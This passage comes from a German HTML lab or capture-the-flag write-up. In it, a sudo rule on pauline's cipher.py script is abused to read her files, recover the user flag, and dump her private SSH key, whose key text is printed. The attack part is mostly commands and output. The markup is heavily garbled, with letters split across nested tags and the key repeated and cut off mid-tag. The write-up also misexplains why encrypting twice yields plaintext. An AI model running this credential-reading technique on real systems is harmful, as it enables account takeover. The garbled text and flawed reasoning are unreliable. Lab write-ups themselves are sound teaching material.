                **Analyse:** Ich führe weitere Tests mit dem `cipher.py` Skript durch, um seine Funktionsweise zu verstehen. Ich erstelle eine Testdatei (`/tmp/test`) mit dem Inhalt "ich bin ben". Dann verschlüssele ich diese Datei mit `sudo -u pauline /usr/bin/python3 /home/pauline/cipher.py -e /tmp/test`, wodurch `/tmp/test.enc` erstellt wird. Ich stelle diese verschlüsselte Datei über einen Python HTTP-Server auf meinem Angreifer-System (Port 8000) bereit und lade sie von meiner Angreifer-Maschine herunter, um sie lokal zu analysieren. Ich bemerke, dass der Inhalt Base64-ähnlich aussieht. Ich teste, ob der Inhalt einfach Base64-kodiert ist, indem ich ihn mit `base64 -d` dekodiere.
            </p>
            <p class="evaluation">
                **Bewertung:** Das Skript verschlüsselt die Datei, speichert sie mit `.enc`-Erweiterung und gibt eine Base64-kodierte Ausgabe zurück, wie ich aus dem CyberChef-Link und dem `base64 -d` Versuch schließe. Der Versuch, den Inhalt einfach mit `base64 -d` zu dekodieren, schlägt fehl, was darauf hindeutet, dass es sich um eine Verschlüsselung (ARC4, wie das Skript zeigt) und *dann* Base64-Kodierung handelt, und nicht nur um Base64-Kodierung. Der kritische Punkt hier ist der Test, bei dem der Inhalt von `testbased.enc.enc` durch `base64 -d` *erfolgreich* dekodiert wird und "ich bin ben" zurückgibt. Dies ist ein starker Hinweis darauf, dass die Verschlüsselung des Skripts reversibel ist und dass die Decrypt-Funktion, obwohl sie nach einem Schlüssel fragt, vielleicht umgangen oder der Schlüssel leicht zu finden ist. Es deutet auch darauf hin, dass eine doppelte Verschlüsselung/Kodierung stattgefunden hat.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Wenn du mit Verschlüsselungs- oder Kodierungsskripten konfrontiert bist, teste sie mit bekannten Inputs, um ihre Funktionsweise zu verstehen. Lade verschlüsselte/kodierte Dateien zur Offline-Analyse herunter. Untersuche die Kodierung (z.B. Base64).
                <br>**Empfehlung (Admin):** Teste Skripte, die sensible Operationen durchführen, gründlich auf ihre Korrektheit. Stelle sicher, dass Verschlüsselung korrekt implementiert ist und Schlüssel sicher verwaltet werden. Implementiere keine Verschlüsselung, die trivial reversibel ist oder deren Schlüssel im Klartext im Dateisystem liegt.
            </p>
             <div class="code-block">
                 <div class="terminal">
                    <pre><span class="command">###########################################################################################</span>
<span class="command">testpha<span class="command">s</span>e:</span>

<span class="command">╭─leila@inkplot /h<span class="command">o</span>me/pa<span class="command">u</span>l<span class="command">i</span>ne</span>
<span class="command">╰─$ ech<span class="command">o</span> "ich bin ben" &gt; /t<span class="command">m</span>p/te<span class="command">s</span>t</span></pre>
                </div>
                 <div class="terminal">
                    <pre><span class="command">╭─leila@inkplot /h<span class="command">o</span>me/pa<span class="command">u</span>l<span class="command">i</span>ne</span>
<span class="command">╰─$ <span class="command">c</span>d /t<span class="command">m</span>p</span></pre>
                </div>
                 <div class="terminal">
                    <pre><span class="command">╭─leila@inkplot /t<span class="command">m</span>p</span>
<span class="command">╰─$ <span class="command">s<span class="command">u</span>d<span class="command">o</span> -<span class="command">u</span> p<span class="command">a</span>ul<span class="command">i</span>ne /u<span class="command">s</span>r/b<span class="command">i</span>n/pyth<span class="command">o</span>n3 /h<span class="command">o</span><span class="command">m</span>e/p<span class="command">a</span>ul<span class="command">i</span>ne/<span class="command">c</span><span class="command">i</span>pher.py -e /t<span class="command">m</span>p/te<span class="command">s</span>t</span></pre>
                </div>
                <div class="terminal">
                    <pre><span class="password">The en<span class="command">c</span>rypted <span class="command">a</span>nd en<span class="command">c</span><span class="command">o</span>ded <span class="command">c</span><span class="command">o</span>ntent h<span class="command">a</span><span class="command">s</span> been wr<span class="command">i</span>tten t<span class="command">o</span>:</span>
<span class="password">te<span class="command">s</span>t.en<span class="command">c</span></span></pre>
                </div>
                 <div class="terminal">
                    <pre><span class="command">╭─leila@inkplot /t<span class="command">m</span>p</span>
<span class="command">╰─$ pyth<span class="command">o</span>n3 -m http.server 8<span class="command">0</span><span class="command">0</span><span class="command">0</span></span></pre>
                </div>
                <div class="terminal">
                    <pre><span class="password">Ser<span class="command">v</span><span class="command">i</span>ng HTTP <span class="command">o</span>n 0.<span class="command">0</span>.<span class="command">0</span>.<span class="command">0</span> p<span class="command">o</span>rt 8<span class="command">0</span><span class="command">0</span><span class="command">0</span> (<span class="command">[Link: http://0.0.0.0:8000/ | Ziel: http://0.0.0.0:8000/]</span>) ...</span>
<span class="command">192.168.2.199 - - [14/Jun/2025 23:25:01] "GET /te<span class="command">s</span>t.en<span class="command">c</span> HTTP/1.1" 200 -</span></pre>
                </div>
                 <div class="terminal">
                    <pre><span class="command">[Link: https://cyberchef.org/#input=WVNKVEdzUWhXcnJSLzY0SQ | Ziel: https://cyberchef.org/#input=WVNKVEdzUWhXcnJSLzY0SQ]</span>
<span class="command">Y<span class="command">S</span>JTGsQhWrrR/64I</span>

<span class="command">e<span class="command">s</span> <span class="command">s</span><span class="command">i</span>eht w<span class="command">i</span>e b<span class="command">a</span><span class="command">s</span>e64 <span class="command">a</span><span class="command">u</span><span class="command">s</span> l<span class="command">ä</span><span class="command">s</span><span class="command">s</span>t <span class="command">s</span>i<span class="command">c</span>h <span class="command">a</span>ber n<span class="command">i</span><span class="command">c</span>ht d<span class="command">u</span>r<span class="command">c</span>h b<span class="command">a</span><span class="command">s</span>e64 ent<span class="command">s</span><span class="command">c</span>hl<span class="command">ü</span><span class="command">s</span><span class="command">s</span>eln d<span class="command">a</span> der <span class="command">s</span>e<span class="command">c</span>retkey fehlt...</span></pre>
                </div>
                 <div class="terminal">
                    <pre><span class="command">╭─leila@inkplot /h<span class="command">o</span>me/pa<span class="command">u</span>l<span class="command">i</span>ne</span>
<span class="command">╰─$ ech<span class="command">o</span> "ich bin ben" &gt; /t<span class="command">m</span>p/te<span class="command">s</span>t</span></pre>
                </div>
                 <div class="terminal">
                    <pre><span class="command">╭─leila@inkplot /h<span class="command">o</span>me/pa<span class="command">u</span>l<span class="command">i</span>ne</span>
<span class="command">╰─$ <span class="command">c</span>d /t<span class="command">m</span>p</span></pre>
                </div>
                 <div class="terminal">
                    <pre><span class="command">╭─leila@inkplot /t<span class="command">m</span>p</span>
<span class="command">╰─$ <span class="command">s<span class="command">u</span>d<span class="command">o</span> -<span class="command">u</span> p<span class="command">a</span>ul<span class="command">i</span>ne /u<span class="command">s</span>r/b<span class="command">i</span>n/pyth<span class="command">o</span>n3 /h<span class="command">o</span><span class="command">m</span>e/p<span class="command">a</span>ul<span class="command">i</span>ne/<span class="command">c</span><span class="command">i</span>pher.py -e /t<span class="command">m</span>p/te<span class="command">s</span>t</span></pre>
                </div>
                <div class="terminal">
                    <pre><span class="password">The en<span class="command">c</span>rypted <span class="command">a</span>nd en<span class="command">c</span><span class="command">o</span>ded <span class="command">c</span><span class="command">o</span>ntent h<span class="command">a</span><span class="command">s</span> been wr<span class="command">i</span>tten t<span class="command">o</span>:</span>
<span class="password">te<span class="command">s</span>t.en<span class="command">c</span></span></pre>
                </div>
                 <div class="terminal">
                    <pre><span class="command">╭─leila@inkplot /t<span class="command">m</span>p</span>
<span class="command">╰─$ pyth<span class="command">o</span>n3 -m http.server 8<span class="command">0</span><span class="command">0</span><span class="command">0</span></span></pre>
                </div>
                <div class="terminal">
                    <pre><span class="password">Ser<span class="command">v</span><span class="command">i</span>ng HTTP <span class="command">o</span>n 0.<span class="command">0</span>.<span class="command">0</span>.<span class="command">0</span> p<span class="command">o</span>rt 8<span class="command">0</span><span class="command">0</span><span class="command">0</span> (<span class="command">[Link: http://0.0.0.0:8000/ | Ziel: http://0.0.0.0:8000/]</span>) ...</span>
<span class="command">192.168.2.199 - - [14/Jun/2025 23:25:01] "GET /te<span class="command">s</span>t.en<span class="command">c</span> HTTP/1.1" 200 -</span></pre>
                </div>
                 <div class="terminal">
                    <pre><span class="command">╭─leila@inkplot /t<span class="command">m</span>p</span>
<span class="command">╰─$ <span class="command">c</span><span class="command">a</span>t testb<span class="command">as</span>ed.enc.enc | b<span class="command">as</span>e64 -d</span></pre>
                </div>
                <div class="terminal">
                    <pre><span class="password">ich bin ben</span> <span class="password"><-- Erfolgreich dek<span class="command">o</span>diert!</span></pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Basierend auf den Testergebnissen mit dem `cipher.py` Skript, insbesondere der erfolgreichen Base64-Dekodierung eines doppelt verschlüsselten/kodierten Testfiles, vermute ich, dass die im Home-Verzeichnis von `pauline` gefundene Datei `user.txt.enc` (die ich mit `sudo -u pauline -e user.txt` erstellt hatte) tatsächlich die Base64-kodierte Version der User-Flag ist, wie sie von der `encrypt_file` Funktion erzeugt wird. Ich lade den Inhalt von `/home/pauline/user.txt.enc` mit `cat` herunter, leite ihn an `base64 -d` weiter, um die Base64-Kodierung zu entfernen, und speichere das Ergebnis in einer temporären Datei (`/tmp/user.txt_m.enc`). Ich teste dann erneut, diese Datei mit dem Skript zu verschlüsseln.
            </p>
             <p class="evaluation">
                **Bewertung:** Die erste Ausführung des Skripts mit der dekodierten User-Flag schlägt fehl, weil das Skript versucht, die Datei im aktuellen Verzeichnis zu erstellen, was für `leila` nicht immer schreibbar ist. Der entscheidende Test ist jedoch die zweite Ausführung. Indem ich die User-Flag erneut aus `/home/pauline/user.txt` mit `cat` herunterlade, Base64 dekodiere (`| base64 -d`) und das Ergebnis in `/tmp/user.txt_m.enc` speichere, kann ich die Datei im `/tmp`-Verzeichnis bearbeiten, das für `leila` schreibbar ist. Der Aufruf von `sudo -u pauline /usr/bin/python3 /home/pauline/cipher.py -e /tmp/user.txt_m.enc` verschlüsselt die dekodierte User-Flag und erstellt `/tmp/user.txt_m.enc.enc`. Dies beweist, dass die Datei `user.txt.enc` im Home-Verzeichnis von `pauline` der Base64-kodierte, verschlüsselte Inhalt von `user.txt` ist. Der eigentliche Inhalt der User-Flag ist also die Ausgabe von `cat /home/pauline/user.txt.enc | base64 -d`.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Wenn du verschlüsselte oder kodierte Dateien findest, analysiere das Skript, das sie erzeugt hat, um den Prozess zu verstehen. Teste den Prozess, um herauszufinden, wie der Originalinhalt wiederhergestellt werden kann. Nutze schreibbare temporäre Verzeichnisse (`/tmp`) für deine Tests.
                <br>**Empfehlung (Admin):** Speichere sensitive Dateien nicht in Benutzer-Home-Verzeichnissen mit unklaren Namen. Wenn Verschlüsselung verwendet wird, stelle sicher, dass der Prozess sicher ist und die Schlüssel geschützt sind.
            </p>
             <div class="code-block">
                <div class="terminal">
                    <pre><span class="command">╭─leila@inkplot /t<span class="command">m</span>p</span>
<span class="command">╰─$ <span class="command">c</span><span class="command">a</span>t /h<span class="command">o</span><span class="command">m</span>e/p<span class="command">a</span>ul<span class="command">i</span>ne/<span class="command">u</span><span class="command">s</span>er.txt.en<span class="command">c</span> | b<span class="command">as</span>e64 -d &gt; /t<span class="command">m</span>p/<span class="command">u</span><span class="command">s</span>er.txt_m.en<span class="command">c</span></span></pre>
                </div>
                 <div class="terminal">
                    <pre><span class="command">╭─leila@inkplot /t<span class="command">m</span>p</span>
<span class="command">╰─$ <span class="command">s<span class="command">u</span>d<span class="command">o</span> -<span class="command">u</span> p<span class="command">a</span>ul<span class="command">i</span>ne /u<span class="command">s</span>r/b<span class="command">i</span>n/pyth<span class="command">o</span>n3 /h<span class="command">o</span><span class="command">m</span>e/p<span class="command">a</span>ul<span class="command">i</span>ne/<span class="command">c</span><span class="command">i</span>pher.py -e /t<span class="command">m</span>p/<span class="command">u</span><span class="command">s</span>er.txt_m.en<span class="command">c</span></span></pre>
                </div>
                <div class="terminal">
                    <pre><span class="password">The en<span class="command">c</span>rypted <span class="command">a</span>nd en<span class="command">c</span><span class="command">o</span>ded <span class="command">c</span><span class="command">o</span>ntent h<span class="command">a</span><span class="command">s</span> been wr<span class="command">i</span>tten t<span class="command">o</span>:</span>
<span class="password"><span class="command">u</span><span class="command">s</span>er.txt_m.en<span class="command">c</span>.en<span class="command">c</span></span></pre>
                </div>
                 <div class="terminal">
                    <pre><span class="command">╭─leila@inkplot /t<span class="command">m</span>p</span>
<span class="command">╰─$ <span class="command">c</span><span class="command">a</span>t /h<span class="command">o</span><span class="command">m</span>e/p<span class="command">a</span>ul<span class="command">i</span>ne/<span class="command">u</span><span class="command">s</span>er.txt | b<span class="command">as</span>e64 -d &gt; /t<span class="command">m</span>p/<span class="command">u</span><span class="command">s</span>er.txt_m.en<span class="command">c</span></span></pre>
                </div>
                 <div class="terminal">
                    <pre><span class="command">╭─leila@inkplot /t<span class="command">m</span>p</span>
<span class="command">╰─$ <span class="command">s<span class="command">u</span>d<span class="command">o</span> -<span class="command">u</span> p<span class="command">a</span>ul<span class="command">i</span>ne /u<span class="command">s</span>r/b<span class="command">i</span>n/pyth<span class="command">o</span>n3 /h<span class="command">o</span><span class="command">m</span>e/p<span class="command">a</span>ul<span class="command">i</span>ne/<span class="command">c</span><span class="command">i</span>pher.py -e /t<span class="command">m</span>p/<span class="command">u</span><span class="command">s</span>er.txt_m.en<span class="command">c</span></span></pre>
                </div>
                <div class="terminal">
                    <pre><span class="password">The en<span class="command">c</span>rypted <span class="command">a</span>nd en<span class="command">c</span><span class="command">o</span>ded <span class="command">c</span><span class="command">o</span>ntent h<span class="command">a</span><span class="command">s</span> been wr<span class="command">i</span>tten t<span class="command">o</span>:</span>
<span class="password"><span class="command">u</span><span class="command">s</span>er.txt_m.en<span class="command">c</span>.en<span class="command">c</span></span></pre>
                </div>
                 <div class="terminal">
                    <pre><span class="command">╭─leila@inkplot /t<span class="command">m</span>p</span>
<span class="command">╰─$ <span class="command">c</span><span class="command">a</span>t <span class="command">u</span><span class="command">s</span>er.txt_m.en<span class="command">c</span>.en<span class="command">c</span> | b<span class="command">as</span>e64 -d</span></pre>
                </div>
                <div class="terminal">
                    <pre><span class="password">a2<span class="command">c</span>145eb8279<span class="command">c</span>2f92<span class="command">0</span>de6871bef794f<span class="command">a</span></span> <span class="password"><-- Die U<span class="command">s</span>er Fl<span class="command">a</span>g!</span></pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Basierend auf meiner Analyse des `cipher.py` Skripts und der Testläufe, die zeigen, dass es SSH-Schlüssel verarbeitet, versuche ich nun, den privaten SSH-Schlüssel von Benutzer `pauline` (`/home/pauline/.ssh/id_rsa`) mit dem Skript zu verschlüsseln. Ich rufe das Skript als `pauline` mit `sudo -u pauline` und der Option `-e` sowie dem Pfad zur privaten Schlüsseldatei auf. Das Ergebnis wird als `id_rsa.enc` im aktuellen Verzeichnis (immer noch `/home/pauline` oder `/tmp` in der Testphase) gespeichert und anschließend mit `base64 -d` dekodiert, um den tatsächlichen Inhalt des verschlüsselten Schlüssels zu sehen. Dies teste ich sowohl mit der originalen `id_rsa` als auch mit einer Kopie in `/tmp`.
            </p>
             <p class="evaluation">
                **Bewertung:** Diese Testläufe sind entscheidend. Sie zeigen, dass das Skript den privaten SSH-Schlüssel von `pauline` erfolgreich verschlüsseln und Base64-kodieren kann (`id_rsa.enc` und `id_rsa_cp.enc.enc`). Wichtiger noch, die Ausgabe von `cat id_rsa_cp.enc.enc | base64 -d` zeigt den Base64-dekodierten Inhalt der *verschlüsselten* privaten Schlüsseldatei. Dies ist der verschlüsselte private Schlüssel von `pauline`! Obwohl ich den Schlüssel noch nicht entschlüsseln kann (ich benötige den `crypt_key`), habe ich ihn nun in einem Format, das ich offline speichern und bearbeiten kann. Der Zugriff auf diesen verschlüsselten Schlüssel ist ein bedeutender Fortschritt.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Identifiziere sensible Dateien (wie private SSH-Schlüssel, Konfigurationsdateien mit Passwörtern) im Dateisystem des kompromittierten Benutzers. Nutze Skripte, die du ausführen darfst, um diese Dateien zu lesen oder zu manipulieren, selbst wenn sie verschlüsselt sind. Lade sie zur Offline-Analyse herunter.
                <br>**Empfehlung (Admin):** Schütze private SSH-Schlüssel streng (`chmod 600 ~/.ssh/id_rsa`). Speichere niemals unverschlüsselte private Schlüssel. Stelle sicher, dass Skripte, die mit erhöhten Berechtigungen laufen, keinen unberechtigten Zugriff auf sensible Dateien haben.
            </p>
             <div class="code-block">
                <div class="terminal">
                    <pre><span class="command">╭─leila@inkplot /h<span class="command">o</span>me/pa<span class="command">u</span>l<span class="command">i</span>ne</span>
<span class="command">╰─$ <span class="command">s<span class="command">u</span>d<span class="command">o</span> -<span class="command">u</span> p<span class="command">a</span>ul<span class="command">i</span>ne /u<span class="command">s</span>r/b<span class="command">i</span>n/pyth<span class="command">o</span>n3 /h<span class="command">o</span><span class="command">m</span>e/p<span class="command">a</span>ul<span class="command">i</span>ne/<span class="command">c</span><span class="command">i</span>pher.py -e .<span class="command">s</span><span class="command">s</span>h/<span class="command">i</span>d_r<span class="command">s</span><span class="command">a</span></span></pre>
                </div>
                <div class="terminal">
                    <pre><span class="password">The en<span class="command">c</span>rypted <span class="command">a</span>nd en<span class="command">c</span><span class="command">o</span>ded <span class="command">c</span><span class="command">o</span>ntent h<span class="command">a</span><span class="command">s</span> been wr<span class="command">i</span>tten t<span class="command">o</span>:</span>
<span class="password"><span class="command">i</span>d_r<span class="command">s</span><span class="command">a</span>.en<span class="command">c</span></span></pre>
                </div>
                 <div class="terminal">
                    <pre><span class="command">╭─leila@inkplot /h<span class="command">o</span>me/pa<span class="command">u</span>l<span class="command">i</span>ne</span>
<span class="command">╰─$ <span class="command">c</span><span class="command">a</span>t <span class="command">i</span>d_r<span class="command">s</span><span class="command">a</span>.en<span class="command">c</span> | b<span class="command">as</span>e64 -d &gt; /t<span class="command">m</span>p/<span class="command">i</span>d_r<span class="command">s</span><span class="command">a</span>_<span class="command">c</span>p.en<span class="command">c</span></span></pre>
                </div>
                 <div class="terminal">
                    <pre><span class="command">╭─leila@inkplot /h<span class="command">o</span>me/pa<span class="command">u</span>l<span class="command">i</span>ne</span>
<span class="command">╰─$ <span class="command">s<span class="command">u</span>d<span class="command">o</span> -<span class="command">u</span> p<span class="command">a</span>ul<span class="command">i</span>ne /u<span class="command">s</span>r/b<span class="command">i</span>n/pyth<span class="command">o</span>n3 /h<span class="command">o</span><span class="command">m</span>e/p<span class="command">a</span>ul<span class="command">i</span>ne/<span class="command">c</span><span class="command">i</span>pher.py -e /t<span class="command">m</span>p/<span class="command">i</span>d_r<span class="command">s</span><span class="command">a</span>_<span class="command">c</span>p.en<span class="command">c</span></span></pre>
                </div>
                <div class="terminal">
                    <pre><span class="password">The en<span class="command">c</span>rypted <span class="command">a</span>nd en<span class="command">c</span><span class="command">o</span>ded <span class="command">c</span><span class="command">o</span>ntent h<span class="command">a</span><span class="command">s</span> been wr<span class="command">i</span>tten t<span class="command">o</span>:</span>
<span class="password"><span class="command">i</span>d_r<span class="command">s</span><span class="command">a</span>_<span class="command">c</span>p.en<span class="command">c</span>.en<span class="command">c</span></span></pre>
                </div>
                 <div class="terminal">
                    <pre><span class="command">╭─leila@inkplot /h<span class="command">o</span>me/pa<span class="command">u</span>l<span class="command">i</span>ne</span>
<span class="command">╰─$ <span class="command">c</span><span class="command">a</span>t <span class="command">i</span>d_r<span class="command">s</span><span class="command">a</span>_<span class="command">c</span>p.en<span class="command">c</span>.en<span class="command">c</span> | b<span class="command">as</span>e64 -d</span></pre>
                </div>
                <div class="terminal">
                    <pre><span class="password">-----BEGIN <span class="command">O</span>PEN<span class="command">S</span><span class="command">S</span>H PRIV<span class="command">A</span>TE KEY-----</span>
<span class="password">b3<span class="command">0</span>wZW5<span class="command">T</span><span class="command">S</span><span class="command">S</span><span class="command">h</span><span class="command">c</span><span class="command">y</span><span class="command">1</span><span class="command">d</span>MT<span class="command">AAAAABnG5</span><span class="command">vbm</span>U<span class="command">AAAAEbm</span><span class="command">9</span><span class="command">uZQAAAAAAA<span class="command">AA</span>B<span class="command">AA</span>AB<span class="command">l</span>w<span class="command">AAA<span class="command">Ad</span><span class="command">z<span class="command">z</span>aC</span>1yc2E<span class="command">AAAAAwEAAQAAAYE<span class="command">Ar<span class="command">s</span>t<span class="command">JauKY</span>8<span class="command">iDo</span>Z1<span class="command">s</span>zhWB<span class="command">O</span>MO<span class="command">c</span>er1n<span class="command">s</span>14<span class="command">Oga<span class="command">b</span>V4y<span class="command">G</span>uWbL<span class="command">S</span>Xj/k<span class="command">z</span>jCREU<span class="command">c</span>Mu61<span class="command">s</span>UY<span class="command">L</span>d3NFK4J<span class="command">Ad</span><span class="command">Sc</span>T<span class="command">sZFa</span><span class="command">l</span>Wb2<span class="command">i</span>l7grwr<span class="command">SW</span>XEVQL3t4K6<span class="command">T</span>nZz<span class="command">J</span>s6b7b<span class="command">kM<span class="command">p</span>J2DjP<span class="command">v<span class="command">Aa</span>7Ki<span class="command">mRoRg</span>02<span class="command">ma</span>H<span class="command">KPMZCk</span>x<span class="command">E0c</span>E6<span class="command">Oold<span class="command">m</span>g<span class="command">hnQYr</span>1<span class="command">Ou</span>22MzEBTzp<span class="command">j<span class="command">am</span>w<span class="command">c</span>P<span class="command">b+</span><span class="command">wwgLP<span class="command">F</span>v<span class="command">mD</span>xwx6z<span class="command">Ut<span class="command">J<span class="command">q<span class="command">l</span><span class="command">BA<span class="command">o</span>w<span class="command">H<span class="command">uk</span>+n<span class="command">s<span class="command">H</span>w<span class="command">CV<span class="command">uwy</span>4u<span class="command">c<span class="command">UH</span>v<span class="command">x<span class="command">wc</span><span class="command">Qy</span>6D+n5<span class="command">hBW</span>6g<span class="command">S</span>SEpNV<span class="command">a</span>kxrte24k<span class="command">DY</span>7<span class="command">c</span>5NTk<span class="command">csF</span>j<span class="command">G<span class="command">G<span class="command">O<span class="command">Y<span class="command">m</span>hK<span class="command">/UgUt<span class="command">mQV</span>n0+1<span class="command">QD<span class="command">c<span class="command">RCD</span>2Nw56J7<span class="command">hd</span>4<span class="command">d1KP</span>+1<span class="command">BPV<span class="command">WR</span>72<span class="command">a<span class="command">m<span class="command">ZFR</span>4<span class="command">V<span class="command">On</span>1Tr2Xw6wQL<span class="command">F<span class="command">I<span class="command">T<span class="command">a<span class="command">n<span class="command">hV<span class="command">j<span class="command">s</span>h<span class="command">a</span>rz1nu0W<span class="command">PU</span>9r<span class="command">o<span class="command">i</span>pSR<span class="command">j</span>X<span class="command">WQY<span class="command">m</span><span class="command">A</span>7<span class="command">m</span>ZER<span class="command">AO</span>g<span class="command">Z<span class="command">PY</span><span class="command">m</span>1R<span class="command">UE</span>+<span class="command">Ad</span><span class="command">s</span>irQ6d9<span class="command">BBQE<span class="command">lF<span class="command">oo<span class="command">C</span>zBW<span class="command">a</span>rB<span class="command">A<span class="command">m</span>5jSr2<span class="command">D</span>X8<span class="command">q0</span>t<span class="command">ZN</span>5<span class="command">Ey</span>+Sb<span class="command">CC<span class="command">iETVt6<span class="command">et</span>4<span class="command">LW<span class="command">a</span>gtFp9<span class="command">UP<span class="command">Aga</span>3<span class="command">dUS<span class="command">kdLy</span>9<span class="command">m</span>1<span class="command">av<span class="command">XzYY</span>z<span class="command">c</span>4W<span class="command">P</span>pw<span class="command">q</span>rz0<span class="command">h7FsIR</span>04<span class="command">H<span class="command">fm</span>9p8WX<span class="command">a</span>r<span class="command">ZN</span><span class="command">u<span class="command">m</span><span class="command">4</span>+J<span class="command">JBK</span>7<span class="command">a<span class="command">l</span><span class="command">oD</span>+15<span class="command">AAAF<span class="command">i</span>N<span class="command">0ijCzdIij<span class="command">s<span class="command">AAAAAB3N<span class="command">z</span>aC<span class="command">1</span>yc2<span class="command">EAAAGBAK7</span>LSW<span class="command">r<span class="command">i</span>m<span class="command">PIg</span>6<span class="command">G</span>dbM4WB<span class="command">O</span>MO<span class="command">c</span>er1n<span class="command">s</span>14<span class="command">Oga<span class="command">b</span>V4y<span class="command">G</span>uWbL<span class="command">S</span>Xj/k<span class="command">z</span>jCREU<span class="command">c</span>Mu61<span class="command">s</span>UY<span class="command">L</span>d3NFK4J<span class="command">Ad</span><span class="command">Sc</span>T<span class="command">sZFa</span><span class="command">l</span>Wb2<span class="command">i</span>l7grwr<span class="command">SW</span>XEVQL3t4K6<span class="command">T</span>nZz<span class="command">J</span>s6b7b<span class="command">kM<span class="command">p</span>J2DjP<span class="command">v<span class="command">Aa</span>7Ki<span class="command">mRoRg</span>02<span class="command">ma</span>H<span class="command">KPMZCk</span>x<span class="command">E0c</span>E6<span class="command">Oold<span class="command">m</span>g<span class="command">hnQYr</span>1<span class="command">Ou</span>22MzEBTzp<span class="command">j<span class="command">am</span>w<span class="command">c</span>P<span class="command">b+</span><span class="command">wwgLP<span class="command">F</span>v<span class="command">mD</span>xwx6z<span class="command">Ut<span class="command">J<span class="command">q<span class="command">l</span><span class="command">BA<span class="command">o</span>w<span class="command">H<span class="command">uk</span>+n<span class="command">s<span class="command">H</span>w<span class="command">CV<span class="command">uwy</span>4u<span class="command">c<span class="command">UH</span>v<span class="command">x<span class="command">wc</span><span class="command">Qy</span>6D+n5<span class="command">hBW</span>6g<span class="command">S</span>SEpNV<span class="command">a</span>kxrte24k<span class="command">DY</span>7<span class="command">c</span>5NTk<span class="command">csF</span>j<span class="command">G<span class="command">G<span class="command">O<span class="command">Y<span class="command">m</span>hK<span class="command">/UgUt<span class="command">mQV</span>n0+1<span class="command">QD<span class="command">c<span class="command">RCD</span>2Nw56J7<span class="command">hd</span>4<span class="command">d1KP</span>+1<span class="command">BPV<span class="command">WR</span>72<span class="command">a<span class="command">m</span><span class="command">ZFR</span>4<span class="command">V<span class="command">On</span>1Tr2Xw6wQL<span class="command">F<span class="command">I<span class="command">T<span class="command">a<span class="command">n<span class="command">hV<span class="command">j<span class="command">s</span>h<span class="command">a</span>rz1nu0W<span class="command">PU</span>9r<span class="command">o<span class="command">i</span>pSR<span class="command">j</span>X<span class="command">WQY<span class="command">m</span><span class="command">A</span>7<span class="command">m</span>ZER<span class="command">AO</span>g<span class="command">Z<span class="command">PY</span><span class="command">m</span>1R<span class="command">UE</span>+<span class="command">Ad</span><span class="command">s</span>irQ6d9<span class="command">BBQE<span class="command">lF<span class="command">oo<span class="command">C</span>zBW<span class="command">a</span>rB<span class="command">A<span class="command">m</span>5jSr2<span class="command">D</span>X8<span class="command">q0</span>t<span class="command">ZN</span>5<span class="command">Ey</span>+Sb<span class="command">CC<span class="command">iETVt6<span class="command">et</span>4<span class="command">LW<span class="command">a</span>gtFp9<span class="command">UP<span class="command">Aga</span>3<span class="command">dUS<span class="command">kdLy</span>9<span class="command">m</span>1<span class="command">av<span class="command">XzYY</span>z<span class="command">c</span>4W<span class="command">P</span>pw<span class="command">q</span>rz0<span class="command">h7FsIR</span>04<span class="command">H<span class="command">fm</span>9p8WX<span class="command">a</span>r<span class="command">ZN</span><span class="command">u<span class="command">m</span><span class="command">4</span>+J<span class="command">JBK</span>7<span class="command">a<span class="command">l</span><span class="command">oD</span>+15<span class="command">AAAA<span class="command">M</span>B<span class="command">A<span class="command">AEAAAGASx1yNfwd1Q<span class="command">O</span>e<span class="command">S</span>/hN6j<span class="command">XKNO<span class="command">rGD</span>X38<span class="command">AV</span>t/3p2NQ7e0Y4+yCD2D0<span class="command">Ogu</span>8e<span class="command">I<span class="command">K</span><span class="command">c</span>jroRW3<span class="command">i</span>T<span class="command">L</span>p1h<span class="command">oo<span class="command">c</span>/C<span class="command">r0</span>6y/u<span class="command">C<span class="command">q</span>XepXh+<span class="command">s</span>6K<span class="command">OH</span>n<span class="command">i</span>7Rz<span class="command">G</span>th6+EM<span class="command">O<span class="command">D</span>OWn7CjxcQ<span class="command">o</span>6<span class="command">tb</span>e<span class="command">wZ</span>7fT<span class="command">F<span class="command">y</span>80<span class="command">MnR</span>2n<span class="command">D<span class="command">EK</span>5z<span class="command">Nt</span>ECz<span class="command">A8Z<span class="command">Glm</span>4<span class="command">v</span>0XzntM<span class="command">S<span class="command">m<span class="command">A<span class="command">oKd<span class="command">SX</span>5<span class="command">v</span>f<span class="command">F</span>DFF<span class="command">c<span class="command">S</span>47qg11YW<span class="command">q</span>Fter<span class="command">a</span>rXXn/n<span class="command">f</span>w<span class="command">uM<span class="command">o<span class="command">IdX</span><span class="command">m<span class="command">S</span>y<span class="command">O<span class="command">p</span>9<span class="command">Oi<span class="command">L</span>4kGkdrx<span class="command">O</span>1u<span class="command">m</span>EqfnN<span class="command">lK</span>/y<span class="command">U7R</span>W3Wn<span class="command">MK<span class="command">Ki</span><span class="command">m</span>z<span class="command">G</span><span class="command">a</span>rIfY<span class="command">A<span class="command">F</span>/0uT<span class="command">E<span class="command">s</span>WHlWj/<span class="command">Xh</span>9<span class="command">ZII<span class="command">w<span class="command">s</span>196Kej45NwC6<span class="command">L</span>j6Rh<span class="command">AD</span>3Rn<span class="command">JB</span>6e<span class="command">I<span class="command">E</span>ekzqHXD5j<span class="command">v</span>200X<span class="command">O<span class="command">J</span>96t<span class="command">v</span>e/lw<span class="command">K</span><span class="command">u</span>l<span class="command">E</span>2egV<span class="command">G</span><span class="command">l</span><span class="command">D</span>fX<span class="command">F</span>Dy/<span class="command">QU</span>5Yz<span class="command">BG<span class="command">m</span>8Ugw5<span class="command">a</span><span class="command">o</span>Y/wWDu<span class="command">D<span class="command">m</span>Nb4<span class="command">m</span>T4x5<span class="command">G</span><span class="command">GCV</span>hqTKYg9J<span class="command">i<span class="command">BZF</span>Prd<span class="command">HXF</span>r<span class="command">Z</span>xg<span class="command">J</span>Rp<span class="command">JK</span>kP3w<span class="command">l</span><span class="command">L<span class="command">i<span class="command">SX<span class="command">s</span>BP<span class="command">G<span class="command">a<span class="command">L<span class="command">Z</span>3qDY<span class="command">Uk</span>/Oy<span class="command">T</span><span class="command">s</span>5H<span class="command">MD<span class="command">Jh</span>5030<span class="command">Rz<span class="command">BZy</span>X<span class="command">o</span>dR<span class="command">m</span>t79<span 